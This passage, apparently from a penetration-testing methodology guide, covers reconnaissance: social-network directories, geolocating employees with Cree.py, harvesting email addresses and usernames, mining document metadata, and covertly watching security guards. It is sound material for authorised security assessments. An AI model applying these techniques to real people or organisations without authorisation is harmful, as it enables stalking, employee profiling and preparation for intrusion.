|[<a href="http://www.sonico.com/">http://www.sonico.com/</a> <a href="http://www.sonico.com">http://www.sonico.com</a>]
|General. Popular in Latin America and Spanish and Portuguese speaking regions.</p>
<p>|-
|Stickam
|[<a href="http://www.stickam.com/">http://www.stickam.com/</a> <a href="http://www.stickam.com">http://www.stickam.com</a>]
|Live video streaming and chat.</p>
<p>|-
|StudiVZ
|[<a href="http://www.studivz.net/">http://www.studivz.net/</a> <a href="http://www.studivz.net">http://www.studivz.net</a>]
|University students, mostly in the German-speaking countries. School students and those out of education sign up via its partner sites sch¸lerVZ and meinVZ.</p>
<p>|-
|StumbleUpon
|[<a href="http://www.stumbleupon.com/">http://www.stumbleupon.com/</a> <a href="http://www.stumbleupon.com">http://www.stumbleupon.com</a>]
|Stumble through websites that match your selected interests</p>
<p>|-
|Tagged
|[<a href="http://www.tagged.com/">http://www.tagged.com/</a> <a href="http://www.tagged.com">http://www.tagged.com</a>]
|General. Subject to quite some controversy about its e-mail marketing and privacy policy</p>
<p>|-
|Talkbiznow
|[<a href="http://www.talkbiznow.com/">http://www.talkbiznow.com/</a> <a href="http://www.talkbiznow.com">http://www.talkbiznow.com</a>]
|Business networking</p>
<p>|-
|Taltopia
|[<a href="http://www.taltopia.com/">http://www.taltopia.com/</a> <a href="http://www.taltopia.com">http://www.taltopia.com</a>]
|Online artistic community</p>
<p>|-
|Taringa!
|[<a href="http://www.taringa.net/">http://www.taringa.net/</a> <a href="http://www.taringa.net">http://www.taringa.net</a>]
|General</p>
<p>|-
|TeachStreet
|[<a href="http://www.teachstreet.com/">http://www.teachstreet.com/</a> <a href="http://www.teachstreet.com">http://www.teachstreet.com</a>]
|Education / Learning / Teaching - More than 400 subjects</p>
<p>|-
|TravBuddy.com
|[<a href="http://www.travbuddy.com/">http://www.travbuddy.com/</a> <a href="http://www.travbuddy.com">http://www.travbuddy.com</a>]
|Travel</p>
<p>|-
|Travellerspoint
|[<a href="http://www.travellerspoint.com/">http://www.travellerspoint.com/</a> <a href="http://www.travellerspoint.com">http://www.travellerspoint.com</a>]
|Travel</p>
<p>|-
|tribe.net
|[<a href="http://www.tribe.net/">http://www.tribe.net/</a> <a href="http://www.tribe.net">http://www.tribe.net</a>]
|General</p>
<p>|-
|Trombi.com
|[<a href="http://www.trombi.com/">http://www.trombi.com/</a> <a href="http://www.trombi.com">http://www.trombi.com</a>]
|French subsidiary of Classmates.com</p>
<p>|-
|Tuenti
|[<a href="http://www.tuenti.com/">http://www.tuenti.com/</a> <a href="http://www.tuenti.com">http://www.tuenti.com</a>]
|Spanish-based university and High School social network. Very Popular in Spain</p>
<p>|-
|Tumblr
|[<a href="http://www.tumblr.com/">http://www.tumblr.com/</a> <a href="http://www.tumblr.com">http://www.tumblr.com</a>]
|General. Micro-blogging, RSS</p>
<p>|-
|Twitter
|[<a href="http://twitter.com/">http://twitter.com/</a> <a href="http://twitter.com">http://twitter.com</a>]
|General. Micro-blogging, RSS, updates</p>
<p>|-
|twitpic 
|[<a href="http://twitpic.com/">http://twitpic.com/</a> <a href="http://twitpic.com">http://twitpic.com</a>]
|&nbsp;</p>
<p>|-
|Vkontakte
|[<a href="http://vkontakte.ru/">http://vkontakte.ru/</a> <a href="http://vkontakte.ru/">http://vkontakte.ru/</a>]
|Social Network for Russian-speaking world including former Soviet republics. Biggest site in Russia</p>
<p>|-
|Vampirefreaks.com
|[<a href="http://www.vampirefreaks.com/">http://www.vampirefreaks.com/</a> <a href="http://www.vampirefreaks.com">http://www.vampirefreaks.com</a>]
|Gothic and industrial subculture</p>
<p>|-
|Viadeo
|[<a href="http://www.viadeo.com/">http://www.viadeo.com/</a> <a href="http://www.viadeo.com">http://www.viadeo.com</a>]
|Global Social Networking and Campus Networking available in English, French, German, Spanish, Italian and Portuguese</p>
<p>|-
|Virb
|[<a href="http://www.virb.com/">http://www.virb.com/</a> <a href="http://www.virb.com">http://www.virb.com</a>]
|Social network that focuses heavily on artists, including musicians and photographers</p>
<p>|-
|Vox
|[<a href="http://www.vox.com/">http://www.vox.com/</a> <a href="http://www.vox.com">http://www.vox.com</a>]
|Blogging</p>
<p>|-
|Wakoopa
|[<a href="http://social.wakoopa.com/">http://social.wakoopa.com/</a> <a href="http://social.wakoopa.com">http://social.wakoopa.com</a>]
|For computer fans that want to discover new software and games</p>
<p>|-
|Wattpad
|[<a href="http://www.wattpad.com/">http://www.wattpad.com/</a> <a href="http://www.wattpad.com">http://www.wattpad.com</a>]
|For readers and authors to interact &amp; e-book sharing</p>
<p>|-
|Wasabi
|[<a href="http://www.wasabi.com/">http://www.wasabi.com/</a> <a href="http://www.wasabi.com">http://www.wasabi.com</a>]
|General. UK-based.</p>
<p>|-
|WAYN
|[<a href="http://www.wayn.com/">http://www.wayn.com/</a> <a href="http://www.wayn.com">http://www.wayn.com</a>]
|Travel and lifestyle</p>
<p>|-
|WebBiographies
|[<a href="http://www.webbiographies.com/">http://www.webbiographies.com/</a> <a href="http://www.webbiographies.com">http://www.webbiographies.com</a>]
|Genealogy and biography</p>
<p>|-
|WeeWorld
|[<a href="http://www.weeworld.com/">http://www.weeworld.com/</a> <a href="http://www.weeworld.com">http://www.weeworld.com</a>]
|Teenagers - 10 to 17</p>
<p>|-
|WeOurFamily
|[<a href="http://www.weourfamily.com/">http://www.weourfamily.com/</a> <a href="http://www.weourfamily.com">http://www.weourfamily.com</a>]
|General with emphasis on privacy and security</p>
<p>|-
|Wer-kennt-wen
|[<a href="http://www.wer-kennt-wen.de/">http://www.wer-kennt-wen.de/</a> <a href="http://www.wer-kennt-wen.de">http://www.wer-kennt-wen.de</a>]
|General</p>
<p>|-
|weRead
|[<a href="http://weread.com/">http://weread.com/</a> <a href="http://weread.com">http://weread.com</a>]
|Books</p>
<p>|-
|Windows Live Spaces
|[<a href="http://spaces.live.com/">http://spaces.live.com/</a> <a href="http://spaces.live.com">http://spaces.live.com</a>]
|Blogging (formerly MSN Spaces)</p>
<p>|-
|WiserEarth
|[<a href="http://www.wiserearth.org/">http://www.wiserearth.org/</a> <a href="http://www.wiserearth.org">http://www.wiserearth.org</a>]
|Online community space for the social justice and environmental movement</p>
<p>|-
|Wordpress
|[<a href="http://wordpress.org/">http://wordpress.org/</a> <a href="http://wordpress.org">http://wordpress.org</a>]
|&nbsp;</p>
<p>|-
|WorldFriends
|[<a href="http://www.worldfriends.tv/">http://www.worldfriends.tv/</a> <a href="http://www.worldfriends.tv">http://www.worldfriends.tv</a>]
|&nbsp;</p>
<p>|-
|Xanga
|[<a href="http://www.xanga.com/">http://www.xanga.com/</a> <a href="http://www.xanga.com">http://www.xanga.com</a>]
|Blogs and "metro" areas</p>
<p>|-
|XING
|[<a href="http://www.xing.com/">http://www.xing.com/</a> <a href="http://www.xing.com">http://www.xing.com</a>]
|Business (primarily Europe (Germany, Austria, Switzerland) and China)</p>
<p>|-
|Xt3
|[<a href="http://www.xt3.com/">http://www.xt3.com/</a> <a href="http://www.xt3.com">http://www.xt3.com</a>]
|Catholic social networking, created after World Youth Day 2008</p>
<p>|-
|Yammer
|[<a href="http://www.yammer.com/">http://www.yammer.com/</a> <a href="http://www.yammer.com">http://www.yammer.com</a>]
|Social networking for office colleagues</p>
<p>|-
|Yelp, Inc.
|[<a href="http://www.yelp.com/">http://www.yelp.com/</a> <a href="http://www.yelp.com">http://www.yelp.com</a>]
|Local Business Review and Talk</p>
<p>|-
|Yfrog
|[<a href="http://yfrog.com/">http://yfrog.com/</a> <a href="http://yfrog.com">http://yfrog.com</a>]
|&nbsp;</p>
<p>|-
|Youmeo
|[<a href="http://youmeo.com/">http://youmeo.com/</a> <a href="http://youmeo.com">http://youmeo.com</a>]
|UK Social Network (focus on data portability)</p>
<p>|-
|Zoo.gr
|[<a href="http://www.zoo.gr/">http://www.zoo.gr/</a> <a href="http://www.zoo.gr">http://www.zoo.gr</a>]
|Greek Web Meeting point</p>
<p>|-
|Zooppa
|[<a href="http://zooppa.com/">http://zooppa.com/</a> <a href="http://zooppa.com">http://zooppa.com</a>]
|Online Community for Creative Talent (host of brand sponsored advertising contests)</p>
<p>|}</p>
<p>'''Tone and Frequency'''</p>
<p>Identifying an employee's tone and frequency of postings can be a critical indicator of a disgruntled employee as well as the corporate acceptance of social networking.   While time consuming it is possible to establish an employee's work schedule and vacation periods.</p>
<p>'''Location awareness'''</p>
<p>Most social networking sites offer the ability to include geolocation information in postings.  This information can be useful in identifying exactly where the person was physically located when a posting was made.  In addition, it is possible that geolocation information is included in images that are uploaded to social networking sites.  It is possible that the user may be savy enough to turn this off, however, sometimes it's just as simple as reading a post that indicates exactly where they're located.</p>
<h5 id="creepy">Cree.py</h5>
<p>Cree.py is Beta tool that is used to automate the task of information gathering from Twitter as well as FourSquare. In addition, Cree.py can gather any geolocation data from flickr, twitpic.com, yfrog.com, img.ly, plixi.com, twitrpix.com, foleext.com, shozu.com, pickhur.com, moby.to, twitsnaps.com and twitgoo.com.  Cree.py is an open source intelligence gathering application.  To install Cree.py, you will need to add a repository to your /etc/apt/sources.list.</p>
<pre>echo "deb http://people.dsv.su.se/~kakavas/creepy/ binary/" >> /etc/apt/sources.list</pre>

<p>Update package list
<pre>apt-get update</pre></p>
<p>Install creepy
<pre>apt-get install creepy</pre></p>
<p>[[:File:Penetration_Testing_Execution_03.png|Cree.py Interface]]</p>
<p>Cree.py is primarily targeting geolocation related information about users from social networking platforms and image hosting services.  The information is presented in a map inside the application where all the retrieved data is shown accompanied with relevant information (i.e. what was posted from that specific location) to provide context to the presentation.<br></p>
<p>[[:File:Penetration_Testing_Execution_04.png|Cree.py Interface]]</p>
<h3 id="internet-footprint">Internet Footprint</h3>
<p>Internet Footprinting is where we attempt to gather externally available information about the target infrastructure that we can leveraged in later phases.</p>
<h4 id="email-addresses">Email addresses</h4>
<p>Gathering email addresses while seemingly useless can provide us with valuable information about the target environment.  It can provide information about potential naming conventions as well as potential targets for later use.  There are many tools that can be used to gather email addresses, Maltego for example.</p>
<h5 id="maltego">Maltego</h5>
<p>Paterva [<a href="http://www.paterva.com/">http://www.paterva.com/</a> Maltego] is used to automate the task of information gathering.  Maltego is an open source intelligence and forensics application.  Essentially, Maltego is a data mining and information-gathering tool that maps the information gathered into a format that is easily understood and manipulated.  It saves you time by automating tasks such as email harvesting and mapping subdomains.  The documentation of Maltego is relatively sparse so we are including the procedures necessary to obtain the data required.</p>
<p>Once you have started Maltego, the main interface should be visible.  The six main areas of the interface are the toolbar, the Palette, graph(view) area, overview area, the detailed area, and the property area.</p>
<p>'''
[[:File:Penetration_Testing_Execution_05.png|Screenshot Here]]
'''</p>
<p>Here is a suggested  workflow to get you started, consider it a training exercise rather than absolute since you will want to customize your workflow depending on your engagement.<br></p>
<p>To start, look to the very upper left-hand corner of Maltego and click the "new graph" button.  After that, drag the "domain" item out of the palette onto the graph.  The graph area allows you to process the transforms as well as view the data in either the mining view, dynamic view, edge weighted view as well as the entity list.  When you first add the domain icon to your graph, it will default to "paterva.com" double-click on that icon and change the name to your target's domain(without any subdomain such as www).  Now you are ready to start mining.<br></p>
<ol>
<li>Right click(or double-click) on the domain icon and from "run transform" select the "To Website DNS[using search engine]".  This will hopefully result in all of the subdomains for your target showing up.<br></li>
<li>Select all of the subdomains and run the "To IP Address [DNS] transform".  This should resolve all of the subdomains to their respective IP Addresses.<br>
'''
[[:File:Penetration_Testing_Execution_07.png|Screenshot Here]]
'''<br></li>
<li>From this point you could chose a couple different paths depending on the size of your target but a logical next step is to determine the netblocks so run the "To Netblock [Using natural boundaries]" transform.<br></li>
</ol>
<p>After this point, you should be able to use your imagination as to where to go next.  You will be able to cultivate phone numbers, email addresses, geo location information and much more by using the transforms provided.  The Palette contains all the transforms that are available (or activated) for use.  As of this writing, there are approximately 72 transforms.  One limitation of the "Community Edition" of Maltego is that any given transform will only return 12 results whereas the professional version doesn't have any limitations.<br></p>
<p>Resist the temptation to run "all transforms" since this will likely overload you with data and inhibit your ability to drill down to the most interesting pieces of data that are relevant to your engagement.  </p>
<p>Maltego is not just limited to the pre-engagement portion of your pentest.  You can also import csv/xls dumps of your airodump results back into Maltego to help you visualize the networks.</p>
<h5 id="theharvester">TheHarvester</h5>
<p>TheHarvester is a tool, written by Christian Martorella, that can be used to gather e-mail accounts and subdomain names from different public sources (search engines, pgp key servers).  Is a really simple tool, but very effective.</p>
<pre>root@pentest:/pentest/enumeration/theharvester# ./theHarvester.py

*************************************
*TheHarvester Ver. 1.6             *
*Coded by Christian Martorella      *
*Edge-Security Research             *
*cmartorella@edge-security.com      *
*************************************


Usage: theharvester options

       -d: domain to search or company name
       -b: data source (google,bing,pgp,linkedin)
       -s: start in result number X (default 0)
       -v: verify host name via dns resolution
       -l: limit the number of results to work with(bing goes from 50 to 50 results,
            google 100 to 100, and pgp does'nt use this option)

Examples:./theharvester.py -d microsoft.com -l 500 -b google
         ./theharvester.py -d microsoft.com -b pgp
         ./theharvester.py -d microsoft -l 200 -b linkedin
</pre>

<p>TheHarvester will search the specified data source and return the results.  This should be added to the OSINT document for use at a later stage.</p>
<pre>
root@pentest:/pentest/enumeration/theharvester# ./theHarvester.py -d client.com -b google -l 500

*************************************
*TheHarvester Ver. 1.6             *
*Coded by Christian Martorella      *
*Edge-Security Research             *
*cmartorella@edge-security.com      *
************************************* 

Searching for client.com in google : 

###################################### 


Limit: 500 
Searching results: 0 
Searching results: 100 
Searching results: 200 
Searching results: 300 
Searching results: 400 

Accounts found: 
#################### 
admin@client.com 
nick@client.com 
jane@client.com 
sarah@client.com 
</pre>

<h5 id="netglub">NetGlub</h5>
<p>NetGlub is an open source tool that is very similar to Maltego.  NetGlub is a data mining and information-gathering tool that presents the information gathered in a format that is easily understood.  The documentation of NetGlub is nonexistent at the moment so we are including the procedures necessary to obtain the data required.</p>
<p>Installing NetGlub is not a trivial task, but one that can be accomplished by running the following:</p>
<pre>
apt-get install build-essential mysql-server libmysqlclient-dev zlib1g-dev libperl-dev libnet-ip-perl libopenssl-ruby ruby-dev ruby omt php5-cli nmap libnet-dns-perl libnet-ip-perl python-dev
wget http://pypi.python.org/packages/source/s/simplejson/simplejson-2.1.5.tar.gz
tar -xzvf simplejson-2.1.5.tar.gz
cd simplejson-2.1.5
python2.7 setup.py build
python2.7 setup.py install 
cd ..
wget http://sourceforge.net/projects/pyxml/files/pyxml/0.8.4/PyXML-0.8.4.tar.gz
tar -xvzf PyXML-0.8.4.tar.gz
cd PyXML-0.8.4
wget http://launchpadlibrarian.net/31786748/0001-Patch-for-Python-2.6.patch
patch -p1 < 0001-Patch-for-Python-2.6.patch
python setup.py install 
cd /pentest/enumeration
</pre>

<p>At this point we're going to use a GUI installation of the QT-SDK.  The main thing to point out here is that the installation path needs to be changed during the installation to reflect /opt/qtsdk.  If you use a different path, then you will need to update the paths in the script below to reflect that difference.</p>
<p>Note that during the QT-SDK installation we are reminded for external dependencies, so make sure we run "apt-get install libglib2.0-dev libSM-dev libxrender-dev libfontconfig1-dev libxext-dev".</p>
<pre>
wget http://blog.hynesim.org/ressources/install/qt-sdk-linux-x86-opensource-2010.03.bin
chmod +x qt-sdk-linux-x86-opensource-2010.03.bin
./qt-sdk-linux-x86-opensource-2010.03.bin
wget http://www.graphviz.org/pub/graphviz/stable/SOURCES/graphviz-2.26.3.tar.gz
tar -xzvf graphviz-2.26.3.tar.gz
cd graphviz-2.26.3
./configure
make
make install
cd /pentest/enumeration 
wget http://redmine.lab.diateam.net/attachments/download/1/netglub-1.0.tar.gz
tar -xzvf netglub-1.0.tar.gz 
mv netglub-1.0 netglub
cd /pentest/enumeration/netglub/qng/
/opt/qtsdk/qt/bin/qmake
make

</pre>

<p>Now we need to start MySQL and create the netglub database</p>
<pre>
start mysql 
mysql -u root -ptoor

create database netglub;
use netglub;
create user "netglub"@"localhost";
set password for "netglub"@"localhost" # password("netglub");
GRANT ALL ON netglub.* TO "netglub"@"localhost";
quit

mysql -u root -ptoor netglub < /pentest/enumeration/netglub/master/tools/sql/netglub.sql  

cd /opt/qtsdk/qt/src/plugins/sqldrivers/mysql/
/opt/qtsdk/qt/bin/qmake INCLUDEPATH+#/usr/include/mysql/
make
cp /opt/qtsdk/qt/src/plugins/sqldrivers/mysql/libqsqlmysql.so /opt/qtsdk/qt/plugins/sqldrivers/.
cd /pentest/enumeration/netglub/master
/opt/qtsdk/qt/bin/qmake
make
cd tools/
./install.sh
cd /pentest/enumeration/netglub/slave
/opt/qtsdk/qt/bin/qmake
make
cd tools/
./install.sh
wget http://sourceforge.net/projects/xmlrpc-c/files/Xmlrpc-c%20Super%20Stable/1.16.34/xmlrpc-c-1.16.34.tgz/download
tar -zxvf xmlrpc-c-1.16.34.tgz
cd xmlrpc-c-1.16.34
./configure
make 
make install
</pre>

<p>Once you have installed NetGlub, you'll probably be interested in running it.  This is really a four step process:
Ensure that MySQL is running:<br />
<pre>start mysql</pre></p>
<p>Start the NetGlub Master: 
<pre>/pentest/enumeration/netglub/master/master</pre></p>
<p>Start the NetGlub Slave: 
<pre>/pentest/enumeration/netglub/slave/slave</pre></p>
<p>Start the NetGlub GUI: 
<pre>/pentest/enumeration/netglub/qng/bin/unix-debug/netglub</pre></p>
<p>Now the main interface should be visible.  If you are familiar with Maltego, then you will feel right at home with the interface.  The six main areas of the interface are the toolbar, the Palette, graph, (or view) area, details, and the property area.</p>
<p>'''
[[:File:Penetration_Testing_Execution_166.png|Screenshot Here]]
'''</p>
<p>A complete list of all the transforms that are available (or activated) for use.  As of this writing, there are approximately 33 transforms.  A transform is script that will actually perform the action against a given site.  </p>
<p>'''
[[:File:Penetration_Testing_Execution_167.png|Screenshot Here]]
'''</p>
<p>The graph area allows you to process the transforms as well as view the data in either the mining view, dynamic view, edge weighted view as well as the entity list.  The overview area provides a mini-map of the entities discovered based upon the transforms.  The detail area is where it is possible to drill into the specifics of the entity.  It is possible to view such things as the relationships, as well as details of how the information was generated.  The property area allows you to see the specific properties of the transform populated with the results specific to the entity.  To begin using NetGlub we need to drag and drop a transform from the Palette to the Graph Area.  By default, this will be populated with dummy data.  To edit the entity within the selected transform, do so by editing the entries within the property view.</p>
<p>We first need to determine the Internet infrastructure such as Domains.  To perform this we will drag and drop the Domain transform to the graph area.  Edit the transform to reflect the appropriate domain name for the client.  It is possible to collect nearly all the data that we will initially require by clicking on Run All Transforms.</p>
<p>The data from these entities will be used to obtain additional information.  Within the graph area the results will be visible as illustrated below.</p>
<p>'''
[[:File:Penetration_Testing_Execution_168.png|Screenshot Here]]
'''</p>
<p>Selecting the entities and choosing to run additional transforms the data collected will expand.  If a particular transform has not be used that you want to collect data from, simply drag it to the graph area and make the appropriate changes within the property view.</p>
<p>There will be some information that you will need to enter to ensure that NetGlub functions properly.  For example, you will need to enter in DNS servers which to query.  In addition, you will be asked to provide your Alchemy and Open calais API keys.  </p>
<p>For Alchemy, you will need to go to [<a href="http://www.alchemyapi.com/api/register.html">http://www.alchemyapi.com/api/register.html</a> <a href="http://www.alchemyapi.com/api/register.html">http://www.alchemyapi.com/api/register.html</a>] to receive your own API key.
For Open calais, you will need to go to [<a href="http://www.opencalais.com/APIkey">http://www.opencalais.com/APIkey</a> <a href="http://www.opencalais.com/APIkey">http://www.opencalais.com/APIkey</a>] to receive your own API key.</p>
<h4 id="usernameshandles">Usernames/Handles</h4>
<p>Identifying usernames and handles that are associated with a particular email is useful as this might provide several key pieces of information.  For instance, it could provide a significant clue for username and passwords.  In addition, it can also indicate a particular individual's interest outside of work.  A good place to location this type of information is within discussion groups (Newsgroups, Mailing lists, forums, chat rooms, etc.).</p>
<h4 id="social-networks">Social Networks</h4>
<ul>
<li>[<a href="http://www.checkusernames.com/">http://www.checkusernames.com/</a>  Check Usernames] - Useful for checking the existence of a given username across 160 Social Networks.</li>
</ul>
<h5 id="newsgroups">Newsgroups</h5>
<ul>
<li>[<a href="http://www.google.com/">http://www.google.com/</a> Google] - [<a href="http://www.google.com/">http://www.google.com/</a> <a href="http://www.google.com">http://www.google.com</a>]</li>
<li>[<a href="http://groups.yahoo.com/">http://groups.yahoo.com/</a> Yahoo Groups] - [<a href="http://groups.yahoo.com/">http://groups.yahoo.com/</a> <a href="http://groups.yahoo.com">http://groups.yahoo.com</a>]</li>
<li>[<a href="http://www.delphiforums.com/">http://www.delphiforums.com/</a> Delphi Forums&nbsp;] - [<a href="http://www.delphiforums.com/">http://www.delphiforums.com/</a> <a href="http://www.delphiforums.com">http://www.delphiforums.com</a>]</li>
<li>[<a href="http://www.big-boards.com/">http://www.big-boards.com/</a> Big Boards] - [<a href="http://www.big-boards.com/">http://www.big-boards.com/</a> <a href="http://www.big-boards.com">http://www.big-boards.com</a>]</li>
</ul>
<h5 id="mailing-lists">Mailing Lists</h5>
<ul>
<li>TILE.Net  - [<a href="http://tile.net/lists">http://tile.net/lists</a> <a href="http://tile.net/lists">http://tile.net/lists</a>]</li>
<li>Topica  - [<a href="http://lists.topica.com/">http://lists.topica.com/</a> <a href="http://lists.topica.com">http://lists.topica.com</a>]</li>
<li>L-Soft CataList, the Official Catalog of LISTSERV lists - [<a href="http://www.lsoft.com/lists/listref.html">http://www.lsoft.com/lists/listref.html</a> <a href="http://www.lsoft.com/lists/listref.html">http://www.lsoft.com/lists/listref.html</a>]</li>
<li>The Mail Archive - [<a href="http://www.mail-archive.com/">http://www.mail-archive.com/</a> <a href="http://www.mail-archive.com">http://www.mail-archive.com</a>]</li>
</ul>
<h5 id="chat-rooms">Chat Rooms</h5>
<ul>
<li>SearchIRC  - [<a href="http://searchirc.com/">http://searchirc.com/</a> <a href="http://searchirc.com">http://searchirc.com</a>]</li>
<li>Gogloom - [<a href="http://www.gogloom.com/">http://www.gogloom.com/</a> <a href="http://www.gogloom.com">http://www.gogloom.com</a>]</li>
</ul>
<h5 id="forums-search">Forums Search</h5>
<ul>
<li>BoardReader  - [<a href="http://boardreader.com/">http://boardreader.com/</a> <a href="http://boardreader.com">http://boardreader.com</a>]</li>
<li>Omgili  - [<a href="http://www.omgili.com/">http://www.omgili.com/</a> <a href="http://www.omgili.com">http://www.omgili.com</a>]</li>
</ul>
<h4 id="personal-domain-names">Personal Domain Names</h4>
<p>The ability to locate personal domains that belong to target employees can yield additional information such as potential usernames and passwords.  In addition, it can also indicate a particular individual's interest outside of work.</p>
<h4 id="personal-activities">Personal Activities</h4>
<p>It is not uncommon for individuals to create and publish audio files and videos.  While these may be seem insignificant, they can yield additional information about a particular individual's interest outside of work.</p>
<h5 id="audio">Audio</h5>
<ul>
<li>iTunes - [<a href="http://www.apple.com/itunes">http://www.apple.com/itunes</a> <a href="http://www.apple.com/itunes">http://www.apple.com/itunes</a>]</li>
<li>Podcast.com - [<a href="http://podcast.com/">http://podcast.com/</a> <a href="http://podcast.com">http://podcast.com</a>]</li>
<li>Podcast Directory - [<a href="http://www.podcastdirectory.com/">http://www.podcastdirectory.com/</a> <a href="http://www.podcastdirectory.com">http://www.podcastdirectory.com</a>]</li>
<li>Yahoo! Audio Search - [<a href="http://audio.search.yahoo.com/">http://audio.search.yahoo.com/</a> <a href="http://audio.search.yahoo.com">http://audio.search.yahoo.com</a>]</li>
</ul>
<h5 id="video">Video</h5>
<ul>
<li>YouTube - [<a href="http://youtube.com/">http://youtube.com/</a> <a href="http://youtube.com">http://youtube.com</a>]</li>
<li>Yahoo Video - [<a href="http://video.search.yahoo.com/">http://video.search.yahoo.com/</a> <a href="http://video.search.yahoo.com">http://video.search.yahoo.com</a>]</li>
<li>Google Video - [<a href="http://video.google.com/">http://video.google.com/</a> <a href="http://video.google.com">http://video.google.com</a>]</li>
<li>Bing Video - [<a href="http://www.bing.com/videos">http://www.bing.com/videos</a> <a href="http://www.bing.com/videos">http://www.bing.com/videos</a>]</li>
</ul>
<h4 id="archived-information">Archived Information</h4>
<p>There are times when we will be unable to access web site information due to the fact that the content may no longer be available from the original source.  Being able to access archived copies of this information allows access to past information.  There are several ways to access this archived information.  The primary means is to utilize the cached results under Google's cached results.  As part of an NVA, it is not uncommon to perform Google searches using specially targeted search strings: <br>
cache:<nowiki>&lt;</nowiki>site.com<nowiki>&gt;</nowiki></p>
<p>Note: Replace <nowiki>&lt;</nowiki>site.com<nowiki>&gt;</nowiki> with the name of the domain that you wish to perform the search on.</p>
<p>An additional resource for archived information is the Wayback Machine (<a href="http://www.archive.org">http://www.archive.org</a>).</p>
<p>'''
[[:File:Penetration_Testing_Execution_09.png|Screenshot Here]]
'''</p>
<h4 id="electronic-data">Electronic Data</h4>
<p>Collection of electronic data in direct response to reconnaissance and intelligence gathering should be focused on the target business or individual.</p>
<h5 id="document-leakage">Document leakage</h5>
<p>Publicly available documents should be gathered for essential data (date, time, location specific information, language, and author).  Data collected could provide insight into the current environment, operational procedures, employee training, and human file_suport.</p>
<h5 id="metadata-leakage">Metadata leakage</h5>
<p>Identifying Metadata is possible using specialized search engine.  The goal is to identify data that is relevant to the target corporation.  It may be possible to identify locations, hardware, software and other relevant data from Social Networking posts.  Some search engines that provide the ability to search for Metadata are as follows:</p>
<ul>
<li>ixquick - [<a href="http://ixquick.com/">http://ixquick.com/</a> <a href="http://ixquick.com">http://ixquick.com</a>]</li>
<li>MetaCrawler - [<a href="http://metacrawler.com/">http://metacrawler.com/</a> <a href="http://metacrawler.com">http://metacrawler.com</a>]</li>
<li>Dogpile&nbsp; - [<a href="http://www.dogpile.com/">http://www.dogpile.com/</a> <a href="http://www.dogpile.com">http://www.dogpile.com</a>]</li>
<li>Search.com - [<a href="http://www.search.com/">http://www.search.com/</a> <a href="http://www.search.com">http://www.search.com</a>]</li>
<li>Jeffery's Exif Viewer -  [<a href="http://regex.info/exif.cgi">http://regex.info/exif.cgi</a> <a href="http://regex.info/exif.cgi">http://regex.info/exif.cgi</a>]</li>
</ul>
<p>In addition to search engines, several tools exist to collect files and gather information from various documents.</p>
<h6 id="foca-windows">FOCA (Windows)</h6>
<p>FOCA is a tool that reads metadata from a wide range of document and media formats.  FOCA pulls the relevant usernames, paths, software versions, printer details, and email addresses.  This can all be performed without the need to individually download files.</p>
<h6 id="foundstone-sitedigger-windows">Foundstone SiteDigger (Windows)</h6>
<p>Foundstone has a tool, named SiteDigger, which allows us to search a domain using specially strings from both the Google Hacking Database (GHDB) and Foundstone Database (FSDB).  This allows for slightly over 1640 potential queries available to discover additional information.<br>
'''
[[:File:Penetration_Testing_Execution_10.png|Screenshot Here]]
'''</p>
<p>The specific queries scanned as well as the results of the queries are shown.  To access the results of a query, simply double-click on the link provided to open in a browser.</p>
<h6 id="metagoofil-linuxwindows">Metagoofil (Linux/Windows)</h6>
<p>Metagoofil is a Linux based information gathering tool designed for extracting metadata of public documents (.pdf, .doc, .xls, .ppt, .odp, .ods) available on the client's websites.</p>
<p>Metagoofil generates an html results page with the results of the metadata extracted, plus a list of potential usernames that could prove useful for brute force attacks.  It also extracts paths and MAC address information from the metadata.</p>
<p>Metagoofil has a few options available, but most are related to what specifically you want to target as well the number of results desired.</p>
<p>'''
[[:File:Penetration_Testing_Execution_11.png|Screenshot Here]]
'''</p>
<p>The command to run ''metagoofil ''is as follows:
<pre>
metagoofil.py -d <nowiki>&lt;</nowiki>client domain<nowiki>&gt;</nowiki> -l 100 -f all -o <nowiki>&lt;</nowiki>client domain<nowiki>&gt;</nowiki>.html -t micro-files</pre></p>
<h6 id="exif-reader-windows">Exif Reader (Windows)</h6>
<p>Exif Reader is image file analysis software for Windows.  It analyzes and displays the shutter speed, flash condition, focal length, and other image information included in the Exif image format which is supported by almost all the latest digital cameras.  Exif image files with an extension of JPG can be treated in the same manner as conventional JPEG files.  This software analyzes JPEG files created by digital cameras and can be downloaded from [<a href="http://www.takenet.or.jp/~ryuuji/minisoft/exifread/english">http://www.takenet.or.jp/~ryuuji/minisoft/exifread/english</a> <a href="http://www.takenet.or.jp/">http://www.takenet.or.jp/</a><nowiki>~</nowiki>ryuuji/minisoft/exifread/english].</p>
<h6 id="exiftool-windows-os-x">ExifTool (Windows/ OS X)</h6>
<p>Exif Tool is a Windows and OS X tool for reading Meta information.  ExifTool supports a wide range of file formats.  ExifTool can be downloaded from [<a href="http://www.sno.phy.queensu.ca/~phil/exiftool">http://www.sno.phy.queensu.ca/~phil/exiftool</a> <a href="http://www.sno.phy.queensu.ca/">http://www.sno.phy.queensu.ca/</a><nowiki>~</nowiki>phil/exiftool].</p>
<h6 id="image-search">Image Search</h6>
<p>While not directly related to metadata, Tineye is also useful:
<a href="http://www.tineye.com/">http://www.tineye.com/</a>
If a profile is found that includes a picture, but not a real name, Tineye can sometimes be used to find other profiles on the Internet that may have more information about a person (including personals sites).</p>
<h3 id="covert-gathering">Covert gathering</h3>
<h4 id="on-location-gathering">On-location gathering</h4>
<p>On-Site visits also allow assessment personnel to observe and gather information about the physical, environmental, and operational security of the target.</p>
<h5 id="adjacent-facilities">Adjacent Facilities</h5>
<p>Once the physical locations have been identified, it is useful to identify the adjacent facilities.  Adjacent facilities should be documented and if possible, include any observed shared facilities or services.</p>
<h5 id="physical-security-inspections">Physical security inspections</h5>
<p>Covert Physical security inspections are used to ascertain the security posture of the target.  These are conducted covertly, clandestinely and without any party knowing they are being inspected.  Observation is the key component of this activity.  Physical security measures that should be observed include physical security equipment, procedures, or devices used to protect from possible threats.  A physical security inspection should include, but is not limited to the following:</p>
<h6 id="security-guards">Security guards</h6>
<p>Observing security guards (or security officer) is often the first step in assessing the most visible deterrence.  Security guards are uniformed and act to protect property by maintaining a high visibility presence to deter illegal and inappropriate actions.  By observing security guard movements directly it is possible to determine procedures in use or establish movement patterns.  You will need to observe what the security guards are protecting.  It is possible to utilize binoculars to observe any movement from a safe distance.</p>
